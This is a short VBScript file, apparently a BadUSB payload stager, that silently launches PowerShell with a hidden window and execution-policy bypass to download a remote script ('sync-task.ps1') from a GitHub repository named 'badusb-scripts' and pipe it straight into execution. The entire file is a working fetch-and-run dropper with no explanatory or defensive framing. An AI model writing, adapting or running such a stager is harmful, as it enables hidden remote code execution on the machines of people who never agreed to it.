Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -NoP -W Hidden -Ep Bypass -Command ""irm 'https://raw.githubusercontent.com/MtxTheus1/badusb-scripts/main/sync-task.ps1' | iex""", 0, False
